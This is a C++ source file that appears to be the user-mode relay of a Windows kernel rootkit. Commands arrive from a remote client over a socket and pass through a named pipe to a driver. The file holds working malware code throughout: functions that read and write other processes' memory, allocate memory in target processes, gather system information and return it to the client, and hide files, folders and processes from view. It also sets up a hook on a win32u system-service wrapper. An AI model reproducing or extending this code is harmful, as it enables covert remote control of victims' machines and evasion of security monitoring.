#include "rootreqs.h"
#pragma warning(disable : 4244)


template<typename ... Arg>
uint64_t CallHook(const Arg ... args) {
	printf("Loading user32.dll ..\n");
	if (LoadLibraryA("user32.dll") == NULL) {
		printf("Cannot call the function - user32.dll is not loaded!\n");
		return NULL;
	}
	printf("user32.dll loaded!\n");

	printf("Creating a pointer to the NtQueryCompositionSurfaceStatistics system service wrapper (win32u!NtQueryCompositionSurfaceStatistics)..\n");
	HMODULE Win32uHndl = LoadLibraryA("win32u.dll");
	if (Win32uHndl == NULL) {
		printf("Cannot call the function - win32u.dll is not loaded!\n");
		return NULL;
	}
	printf("win32u.dll loaded!\n");

	void* HookToFunc = GetProcAddress(Win32uHndl, "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function (wrapper of a system service)
	if (HookToFunc == NULL) {
		printf("Cannot call the function - Could not get a pointer to NtQueryCompositionSurfaceStatistics from win32u.dll..\n");
		return NULL;
	}

	printf("Creating a function variable to use it for calling NtQueryCompositionSurfaceStatistics..\n");
	auto HookToVar = static_cast<uint64_t(_stdcall*)(Arg...)>(HookToFunc);  // export the function so i can call it

	printf("Calling the function variable with the supplier argument/s..\n");
	uint64_t HookToRet = HookToVar(args ...);

	printf("Function had worked and return value/s were received, wait for processing..\n");
	if (HookToRet == NULL) {
		printf("Function did not return anything (NULL)..\n");
		HookToRet = 1;
	}
	return HookToRet;
}


int CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog) {
	/*
	if(CallHook(RootkInst) == NULL){
		printf("CallKernelDriver failed - CallHook() returned NULL!\n");
		return FALSE;
	}
	*/

	DWORD LastError = WritePipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
	if (LastError != 0) {
		return -1;
	}

	LastError = ReadPipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
	if (LastError != 0) {
		return -1;
	}

	if (PassBack) {
		PASS_DATA result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
		if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
			MediumLog->WriteLog((PVOID)"CallKernelDriver failed - cannot return results from driver back to client!\n", 77);
			return 0;
		}
	}
	printf("CallKernelDriver success!\n");
	return 1;
}


int InitialKernelCall(HANDLE* PipeHandle, LogFile* MediumLog) {
	ROOTKIT_MEMORY InitData = { 0 };
	InitData.MedPID = (USHORT)GetCurrentProcessId();
	InitData.MainPID = (USHORT)GetPID("meow_client.exe");
	InitData.SemiPID = (USHORT)GetPID("powershell.exe");
	if (InitData.SemiPID == NULL || InitData.MainPID == NULL) {
		return 0;
	}
	return CallKernelDriver(NULL, &InitData, FALSE, PipeHandle, MediumLog);
}


int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA result;
	std::uint32_t SrcPID = NULL;
	std::uint32_t DstPID = NULL;
	PVOID LocalWrite = NULL;
	PVOID WriteToMdl = NULL;
	const char* MagicMdl = "mymyymym";
	char MdlMalloc = 1;
	ULONG WriteToMdlSize = 0;
	SIZE_T AllocSize = 0;
	ROOTKIT_UNEXERR Err = successful;
	SYSTEM_INFO LocalSysInfo = { 0 };

	// Get secondary module string (writing destination) -
	result = root_internet::RecvData(tosock, sizeof(WriteToMdlSize), &WriteToMdlSize, FALSE, 0);
	if (result.err || result.value != sizeof(WriteToMdlSize)) {
		return 0;
	}

	WriteToMdl = malloc(WriteToMdlSize);
	if (WriteToMdl == NULL) {
		MdlMalloc = 0;
		root_internet::SendData(tosock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
		return  0;
	}
	result = root_internet::SendData(tosock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
	if (result.err || result.value != sizeof(MdlMalloc)) {
		free(WriteToMdl);
		return 0;
	}

	result = root_internet::RecvData(tosock, WriteToMdlSize, WriteToMdl, FALSE, 0);
	if (result.err || result.value != WriteToMdlSize) {
		free(WriteToMdl);
		return 0;
	}


	// Get main structure with parameters for the operation -
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		free(WriteToMdl);
		return 0;
	}
	RootkInst->DstMdlName = (char*)WriteToMdl;
	RootkInst->MdlName = WriteFromStr;
	GetSystemInfo(&LocalSysInfo);
	AllocSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);

	// if writing is from a user-supplied buffer receive the buffer -
	if (Err == successful) {
		if (strcmp(RootkInst->MdlName, "regular") == 0) {
			RootkInst->Status = (NTSTATUS)REGULAR_BUFFER;
			LocalWrite = malloc(AllocSize);
			if (!LocalWrite) {
				printf("Cannot allocate buffer for writing locally\n");
				free(WriteToMdl);
				Err = memalloc;
			}
			else {
				result = root_internet::RecvData(tosock, (int)RootkInst->Size, LocalWrite, FALSE, 0);
				if (result.err || result.value != RootkInst->Size) {
					printf("Cannot get write value\n");
					free(LocalWrite);
					free(WriteToMdl);
					return FALSE;
				}
				RootkInst->Buffer = LocalWrite;
			}
		}

	}

	if (Err == successful) {

		// Writing source module PID -
		if (strcmp(RootkInst->MdlName, MagicMdl) == 0 || strcmp(RootkInst->MdlName, "regular") == 0) {
			SrcPID = GetCurrentProcessId();
		}
		else {
			SrcPID = GetPID(RootkInst->MdlName);
		}

		if (SrcPID == NULL) {
			free(WriteToMdl);
			Err = relevantpid;
		}

		// Writing destination module PID -
		if (Err == successful) {
			if (strcmp(RootkInst->DstMdlName, MagicMdl) == 0) {
				DstPID = GetCurrentProcessId();
			}

			else {
				DstPID = GetPID(RootkInst->DstMdlName);
			}

			if (DstPID == NULL) {
				free(WriteToMdl);
				Err = relevantpid;
			}
		}
	}
	

	// Pass arguments, perform the operation and return the results to the client -
	RootkInst->Unexpected = Err;
	if (Err == successful) {
		RootkInst->MainPID = DstPID;
		RootkInst->SemiPID = SrcPID;
		RootkInst->MedPID = GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		int DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			printf("transformation of regular data from KM-UM confirmed!\n");
		}
		else {
			printf("transformation of regular data from KM-UM not working correctly!!!\n");
		}

		free(LocalWrite);
		free(WriteToMdl);
		return DriverRes;
	}
	else {
		result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
		return 0;
	}
}


int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA result;
	std::uint32_t PrcID;
	std::uint32_t DstID;
	const char* MagicMdl = "mymyymym";
	ROOTKIT_UNEXERR Err = successful;
	int KrnlRes = 0;
	SIZE_T AllocSize = 0;
	char FailedValue = 1;
	SYSTEM_INFO LocalSysInfo = { 0 };


	// Receive the main structure with the parameters for the operation -
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}

	RootkInst->MdlName = ModuleName;
	GetSystemInfo(&LocalSysInfo);
	AllocSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);
	LocalRead = malloc(AllocSize);
	if (LocalRead == NULL) {
		Err = memalloc;
	}


	// Configure reading source and destination PIDs -
	if (Err == successful) {
		DstID = GetCurrentProcessId();
		if (DstID == NULL) {
			Err = relevantpid;
		}

		if (Err == successful) {
			if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
				PrcID = GetCurrentProcessId();
			}
			else {
				PrcID = GetPID(RootkInst->MdlName);
			}

			if (PrcID == NULL) {
				Err = relevantpid;
			}
		}
	}

	if (Err == successful) {
		// Pass arguments and perform the operation -
		RootkInst->Out = LocalRead;
		RootkInst->MainPID = PrcID;
		RootkInst->SemiPID = DstID;
		RootkInst->MedPID = GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		KrnlRes = CallKernelDriver(tosock, RootkInst, FALSE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			printf("transformation of regular data from KM-UM confirmed!\n");
		}
		else {
			printf("transformation of regular data from KM-UM not working correctly!!!\n");
		}
	}


	// Return the results of the operation to the client -
	if (Err == successful && KrnlRes == 1) {
		result = root_internet::SendData(tosock, LocalRead, (int)RootkInst->Size, FALSE, 0);
		if (result.err || result.value != (int)RootkInst->Size) {
			return 0;
		}
	}

	else {
		result = root_internet::SendData(tosock, &FailedValue, sizeof(FailedValue), FALSE, 0);
		return KrnlRes;
	}

	RootkInst->Unexpected = successful;
	result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	return 1;
}


int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA result;
	const char* MagicMdl = "mymyymym";
	USHORT PID;
	int DriverRes = FALSE;


	// Receive the main structure with the parameters for the operation -
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	RootkInst->MdlName = ModuleName;


	// Get module PID -
	if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
		PID = (USHORT)GetCurrentProcessId();
	}
	else {
		PID = (USHORT)GetPID(RootkInst->MdlName);
	}

	if (PID != NULL) {
		// Pass the arguments to the driver, perform the operation and return the results back to the client -

		RootkInst->Unexpected = successful;
		RootkInst->MainPID = PID;
		RootkInst->MedPID = GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			printf("transformation of regular data from KM-UM confirmed!\n");
		}
		else {
			printf("transformation of regular data from KM-UM not working correctly!!!\n");
		}
		return DriverRes;
	}
	else {
		RootkInst->Unexpected = relevantpid;
		result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
		return 0;
	}
}


int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA result;
	PVOID SysDataBuffer = NULL;
	ULONG64 TotalSize = 0;
	ULONG FailedSize = 12323;
	char FailedBuffer = 12;
	// RKSYSTEM_INFORMATION_CLASS CurrInf;
	int KrnlRes = FALSE;


	// Receive the main structure with the parameters for the operation -
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		Err = receivedata;
	}
	else {
		RootkInst->MdlName = InfoTypesStr;
	}


	// Handling initial unexpected errors -
	if (Err != successful) {
		RootkInst->Unexpected = Err;
		result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
		return 0;
	}

	// Pass the arguments for the request of system information -
	RootkInst->Unexpected = successful;
	RootkInst->Operation = RKOP_SYSINFO;
	RootkInst->Buffer = AttrBuffer;
	RootkInst->MainPID = (USHORT)GetCurrentProcessId();
	RootkInst->MedPID = GetCurrentProcessId();
	RootkInst->Size = AttrBufferSize;
	RootkInst->IsFlexible = TRUE;
	KrnlRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		printf("transformation of regular data from KM-UM confirmed!\n");
	}
	else {
		printf("transformation of regular data from KM-UM not working correctly!!!\n");
	}


	// Return the actual buffer with system information to the client -
	if (KrnlRes == 1) {
		TotalSize = RootkInst->Size;
		SysDataBuffer = RootkInst->Out;
		result = root_internet::SendData(tosock, &TotalSize, sizeof(TotalSize), FALSE, 0);
		if (result.err || result.value != sizeof(TotalSize)) {
			return 0;
		}

		result = root_internet::SendData(tosock, SysDataBuffer, (int)TotalSize, FALSE, 0);
		if (result.err || result.value != (int)TotalSize) {
			return 0;
		}


		// Send back updated attribute buffer:
		result = root_internet::SendData(tosock, AttrBuffer, (int)AttrBufferSize, FALSE, 0);
		if (result.err || result.value != AttrBufferSize) {
			return 0;
		}
		return 1;
	}

	else {
		result = root_internet::SendData(tosock, &FailedSize, sizeof(FailedSize), FALSE, 0);
		return KrnlRes;
	}
}


int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog){
	PASS_DATA result;
	USHORT PID = 0;
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;


	// Receive the main structure with the parameters for the operation -
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Get PID of the process allocating memory into -
	if (strcmp(ModuleName, "mymyymym") == 0) {
		PID = (USHORT)GetCurrentProcessId();
	}
	else {
		PID = (USHORT)GetPID(ModuleName);
	}


	// Pass arguments to the driver, perform the operation and return the results back to the client -
	if (PID != NULL) {
		RootkInst->Unexpected = successful;
		RootkInst->MdlName = ModuleName;
		RootkInst->MainPID = PID;
		RootkInst->MedPID = GetCurrentProcessId();
		DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			printf("transformation of regular data from KM-UM confirmed!\n");
		}
		else {
			printf("transformation of regular data from KM-UM not working correctly!!!\n");
		}

		if (RootkInst->Buffer == RootkInst->Out) {
			printf("Allocation address stayed the same (%p)!\n", RootkInst->Buffer);
		}
		else {
			printf("Allocation address did not stay the same (%p, %p)!\n", RootkInst->Buffer, RootkInst->Out);
		}
		return DriverRes;
	}
	else {
		result = root_internet::SendData(tosock, &FailedSize, sizeof(FailedSize), FALSE, 0);
		return 0;
	}
}




int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA result;
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	WCHAR FilePath[1024] = { 0 };
	DWORD FilePathLength = 0;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed:
	result = root_internet::RecvData(tosock, sizeof(NTSTATUS), &RequestStatus, FALSE, 0);
	if (result.err || result.value != sizeof(NTSTATUS)) {
		return 0;
	}
	if (RequestStatus == HIDE_FILEFOLDER) {
		result = root_internet::RecvData(tosock, sizeof(DWORD), &FilePathLength, FALSE, 0);
		if (result.err || result.value != sizeof(DWORD)) {
			return 0;
		}
		result = root_internet::RecvData(tosock, FilePathLength, FilePath, FALSE, 0);
		if (result.err || result.value != FilePathLength) {
			return 0;
		}
	}

	// Receive the main structure with the parameters for the operation:
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments:
	if (RequestStatus == HIDE_FILEFOLDER) {
		RootkInst->Buffer = (PVOID)FilePath;
		RootkInst->Size = (ULONG64)FilePathLength;
	}
	else if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
		RootkInst->Out = &DummyAddress;
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MainPID = (USHORT)GetCurrentProcessId();;
	RootkInst->MedPID = (USHORT)GetCurrentProcessId();;
	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		printf("transformation of regular data from KM-UM confirmed!\n");
	}
	else {
		printf("transformation of regular data from KM-UM not working correctly!!!\n");
	}


	// Parse returned data correctly (after sending back main struct):
	if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
		result = root_internet::RecvData(tosock, RootkInst->Size, RootkInst->Out, FALSE, 0);
		if (result.err || result.value != RootkInst->Size) {
			return 0;
		}
	}
	return 1;
}




int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA result;
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed (ADD PREOPERATIONS HERE IF NEEDED):
	result = root_internet::RecvData(tosock, sizeof(NTSTATUS), &RequestStatus, FALSE, 0);
	if (result.err || result.value != sizeof(NTSTATUS)) {
		return 0;
	}


	// Receive the main structure with the parameters for the operation:
	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments and verify parameters before sending to driver:
	if (RequestStatus == SHOWHIDDEN_PROCESS) {
		RootkInst->Out = &DummyAddress;
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MedPID = (USHORT)GetCurrentProcessId();;
	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		printf("transformation of regular data from KM-UM confirmed!\n");
	}
	else {
		printf("transformation of regular data from KM-UM not working correctly!!!\n");
	}


	// Parse returned data correctly (after sending back main struct):
	if (RequestStatus == SHOWHIDDEN_PROCESS) {
		result = root_internet::RecvData(tosock, RootkInst->Size, RootkInst->Out, FALSE, 0);
		if (result.err || result.value != RootkInst->Size) {
			return 0;
		}
	}
	return 1;
}